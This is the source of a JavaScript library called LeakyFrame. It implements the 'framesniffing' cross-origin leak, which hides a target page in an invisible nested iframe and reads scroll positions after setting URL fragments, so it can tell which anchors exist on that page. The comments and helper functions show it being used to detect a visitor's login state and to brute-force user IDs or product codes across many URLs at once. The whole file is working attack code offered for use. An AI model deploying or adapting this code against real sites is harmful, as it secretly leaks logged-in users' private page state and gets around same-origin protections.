/**
 * LeakyFrame JS Library
 *
 * Copyright (c) 2012 Paul Stone
 * 
 * Permission is hereby granted, free of charge, to any person obtaining a copy of this 
 * software and associated documentation files (the "Software"), to deal in the Software 
 * without restriction, including without limitation the rights to use, copy, modify, 
 * merge, publish, distribute, sublicense, and/or sell copies of the Software, and to 
 * permit persons to whom the Software is furnished to do so, subject to the following 
 * conditions:
 * 
 * The above copyright notice and this permission notice shall be included in all copies 
 * or substantial portions of the Software.
 * 
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, 
 * INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A 
 * PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT 
 * HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION 
 * OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE 
 * SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 *
 */

 
/*

This JS library can be used to easily try out the Framesniffing (aka Frame Leak, aka Anchor Element Position Detection) technique. 
Currently (as of Mar 2012) the technique works in IE8, IE9 and most 
webkit-based browsers.

Example usage:

new LeakyFrame('http://example.com', function(frame) {
	if (frame.checkID('login-form')) {
		alert("You're not logged in");
		frame.remove();
		return;
	}

	var anchors = {'foo', 'bar', 'baz'};
	var frags = frame.findFrags(anchors);
	alert('Found the following anchors on the page: ' + frags.join(', '));
}


Redirects
---------
Make sure that the URL you're loading doesn't redirect to a different URL, 
as this can break anchor checking in some browsers and will slow down
checks for multiple anchors (e.g. brute-forcing). 

E.g. You create LeakyFrame with http://foo.com/somepage and it redirects 
to http://foo.com/somepage?98723945

The reason for this is that the JS code can't know the URL that the frame 
has redirected to (due to same-origin policy). When changing the #fragment 
at the end of the URL to check for an anchor, the entire URL must be 
reset using window.location. So if a redirect has occurred, the original
URL will be loaded in the iframe, causing a full page load and another 
redirect to occur.

Some browsers will preserve URL fragments across page redirects (Chrome 
does, and I think IE10 does now too). For those browsers you can create 
a LeakyFrame and pass in a URL with an fragment already on the end, then 
call frame.nonZero() to see if a scroll has occurred. The findManyMatchingURLs
and findFirstMatchingURL methods should also work with redirects.

*/
 
/** 
 * Creates a new LeakyFrame object 
 *
 * This constructor creates a nested iframes and loads 'url' into the inner one
 * The outer frame is 10x10, and the inner frame 1000x10,000px to force the outer
 * frame to scroll when checking for anchors.
 *
 * @param url - URL to load into the iframe. 
 * @param callback - A function that will be called when the frame has loaded. The 
 * the callback function will be passed the newly created LeakyFrame object
 * @param debug - If true, the created frames will be made visible and outer
 * frame will be made larger (140x140)
 */
function LeakyFrame(url, callback, debug) {
    var outer = document.createElement('iframe');
    outer.setAttribute('frameBorder', '0');
    outer.setAttribute('scrolling', 'no')
    document.body.appendChild(outer);
 
    outer.contentWindow.document.open();
    outer.contentWindow.document.close();
    
    var inner = outer.contentWindow.document.createElement('iframe');
    inner.setAttribute('frameBorder', '0');

    outer.contentWindow.document.body.style.margin = 0;
    outer.contentWindow.document.body.style.padding = 0;
    inner.setAttribute('style', 'margin:0; border:none;overflow:hidden;position:absolute; left:0px;top:0px;width:1000px;height:10000px;background-color:white;');
    
    if (!debug)
    	outer.setAttribute('style', 'border:none;opacity:0');

    outer.contentWindow.document.body.appendChild(inner);
    
    outer.width = 10;
    outer.height = 10;
    if (debug) {
        outer.width=140;
        outer.height=140;
    }
    this.outer = outer; // outer iframe element
    this.inner = inner; // inner iframe element
    this.innerWin = inner.contentWindow; // window object of outer iframe 
    this.outerWin = outer.contentWindow; // window object of inner iframe
    this.outerDoc = outer.contentWindow.document; // document of outer iframe
    this.removed = false;
    if (callback)
    	this.load(url, callback);
}

/**
 * Load a new URL into the inner iframe and do a callback when it's loaded
 */
LeakyFrame.prototype.load = function(url, callback) {
    this.inner.contentWindow.location = url;
    var me = this;
    var f = {};
    f.fn = function() {   
    	if (me.inner.removeEventListener)
    		me.inner.removeEventListener('load', f.fn);
    	else if (me.inner.detachEvent)
    		me.inner.detachEvent('onload', f.fn);
    	
        me.currentURL = me._stripFragment(url);
        if (callback)
            callback(me);
    }
    if (this.inner.addEventListener) 
    	this.inner.addEventListener('load', f.fn, false);	
    else if (this.inner.attachEvent)
    	this.inner.attachEvent('onload', f.fn);
}


/**
 * Find the current scroll position of the outer iframe
 * (should correspond to the position of the current anchor
 *  in the inner iframe)
 * @return object with .x and .y properties
 */
LeakyFrame.prototype.getPos = function() {
    var x = this.outerDoc.body.scrollLeft;
    var y = this.outerDoc.body.scrollTop;
    return {x:x, y:y};
}


/**
 * Reset the scroll position of the iframe
 */
LeakyFrame.prototype.resetPos = function() {
	this.outerWin.scrollTo(0,0);	
}

/**
 * Checks if the iframe has scrolled after being reset
 */
LeakyFrame.prototype.nonZero = function() {
    var pos = this.getPos();
    return (pos.x > 0 || pos.y > 0);
};

/**
 * Check if anchor 'id' exists on the currently loaded page
 * This works by first resetting the scroll position, adding 
 * #id onto the end of the current URL and then seeing if 
 * the scroll position has changed.
 *
 * Optional parameters x and y specify the initial scroll 
 * position and default to 0. Useful in some cases where
 * weird scrolling behaviour causes the page to scroll to
 * (0,0) if an anchor is found.
 * 
 * @return boolean - true if the anchor exists
 */
LeakyFrame.prototype.checkID = function(id, x, y) {
	if (!x) x = 0;
	if (!y) y = 0;
    this.outerWin.scrollTo(x,y);
    this.innerWin.location = this.currentURL + '#' + id;    
    var result = this.getPos();
    return (result.x != x || result.y != y);
}

/**
 * Given an array of ids, will check the current page to see which
 * corresponding anchors exist. It will return a dictionary of 
 * positions for each matched anchor.
 * 
 * This can be incredibly quick in some browsers (checking 10s or
 * 100s of IDs per second), so could be used for things like 
 * brute-forcing things like numeric user IDs or lists of product
 * codes.
 * 
 * @param ids - an array of IDs to be checked
 * @param templ - optional template which is used to make the URL
 * fragment. If the template is 'prod{id}foo' and you pass in the 
 * array [5,6,7], then it will check for anchors: 
 * prod5foo, prod6foo and prod7foo
 * @return a dictionary containing matched IDs as keys and an
 * array [x,y] as values
 */
LeakyFrame.prototype.findFragPositions = function(ids, templ) {
    this.outerWin.scrollTo(0,0);
    if (templ) {
        var newids = [];
        for (var i = 0; i < ids.length; i++) 
            newids.push(templ.replace('{id}', ids[i]));
    } else {
        newids = ids;
    }
    var positions = {};
    for (var i = 0; i < ids.length; i++) {
        var id = newids[i];
        //this.outerWin.scrollTo(0,0);
        this.innerWin.location = this.currentURL + '#' + id; 
        var x = this.outerDoc.body.scrollLeft;
        var y = this.outerDoc.body.scrollTop;

        if (x || y) {
            positions[ids[i]] = [x, y];
            this.outerWin.scrollTo(0,0);
        }
    }
    return positions;
}

/** 
 * Same as findFragPositions but discards the positions
 * and returns only an array of matched IDs.
 */
LeakyFrame.prototype.findFrags = function(ids, templ) {
    var found = this.findFragPositions(ids, templ);
    var ids = [];
    for (var id in found)
        ids.push(id);
    return ids;
}

LeakyFrame.prototype._stripFragment = function(url) {
    var pos = url.indexOf('#');
    if (pos < 0) return url;
    this.loadFrag = url.substr(pos+1);
    return url.substr(0, pos)
}

/**
 * Removes the iframe from the document.
 * If you're creating lots of LeakyFrame instances
 * you should call this once you're done with each
 * frame to free up memory.
 */
LeakyFrame.prototype.remove = function() {
    if (this.removed) return;
    this.outer.parentNode.removeChild(this.outer);
    this.removed = true;
}


/**
 * Load a bunch of URLs to find which ones have a matching fragment 
 * (i.e. cause the page to scroll). (static method)
 * 
 * @param url - a base URL to check with {id} where id will go 
 * (e.g http://www.foo.com/userprofile/{id}#me)
 * @param ids - dictionary of key:value pairs. the keys will be 
 * used to replace {id} in each url
 * @param callback - a function that gets called when an id is found. 
 * It gets passed the matching key and value
 * @param finishedcb - a function that gets called when all the urls 
 * have been checked. It gets passed true if any URLs were matched
 */
LeakyFrame.findManyMatchingURLs = function(url, ids, callback, finishedcb, stopOnFirst) {
    var maxConcurrent = 3;
    var inProgress = 0;
    var todo = [];
    var interval;
    var loadCount = 0;
    var allFound = {};
    var allPositions = {};
    var framePool = {};
    var found = 0;
    var cancelled = false;
    for (var key in ids)  {
        todo.push(key);
        loadCount++;
    }

    var cancel = function() { 
    	cancelled = true;
        for (var i in framePool) 
            framePool[i].remove();
        if (interval)
            window.clearInterval(interval);
    }
    
    var cb = function(f, foundFrag) {
        inProgress--;
        loadCount--;
  
        if (f.nonZero()) {
            found++;
            var foundVal = ids[foundFrag];
            var foundPos = f.getPos();
            allFound[foundFrag] = foundVal;
            allPositions[foundFrag] = foundPos;
            
            if (!cancelled)
            	callback(foundFrag, foundVal, foundPos, allFound, allPositions);
            if (stopOnFirst)
                cancel();
        }
        if ((loadCount == 0 && !stopOnFirst) || // 'finished' call for findMany
            (loadCount == 0 && stopOnFirst && found == 0)) // 'fail' callback for stopOnFirst (only if none were found)
            finishedcb(found > 0, allFound, allPositions);
        f.remove();
        delete framePool[foundFrag];
    }
    
    var loadMore = function() {
        if (todo.length == 0) {
            // no more ids to do 
            window.clearInterval(interval);
            interval = null;
        }
        if (inProgress >= maxConcurrent) {
            // queue full, waiting
            return;
        }
        var loops = Math.min(maxConcurrent - inProgress, todo.length);
        for (var i=0; i < loops; i++) {
            inProgress++;
            var nextID = todo.shift();
            var thisurl = url.replace('{id}', nextID);

            framePool[nextID] = new LeakyFrame(thisurl, function(n){ 
                    return function(f){ setTimeout(function() {cb(f,n)}, 50) } // timeout delay required for reliable results on chrome
                }(nextID)
            );
        }
    }
    interval = window.setInterval(loadMore, 500);
}


/**
 * Same as findManyMatchingURLs but stops after the first match is found
 *
 * @param url - a base URL to check with {id} where id will go 
 * (e.g http://www.foo.com/userprofile/{id}#me)
 * @param ids - dictionary of key:value pairs. the keys will be used to 
 * replace {id} in each url
 * @param successcb - a function that gets called when an id is found. 
 * It gets passed the matching key and value
 * @param failcb - a function that gets called if no ids are found
 * @param finalcb - a function that gets called after either sucess or failure
 */
LeakyFrame.findFirstMatchingURL = function(url, ids, successcb, failcb, finalcb) {
    var s = function(k, v) {
        successcb(k, v);
        if (finalcb)
        	finalcb();
    }
    var f = function() {
    	if (failcb) 
    		failcb();
    	if (finalcb)
    		finalcb();
    }
    return LeakyFrame.findManyMatchingURLs(url, ids, s, f, true);
}
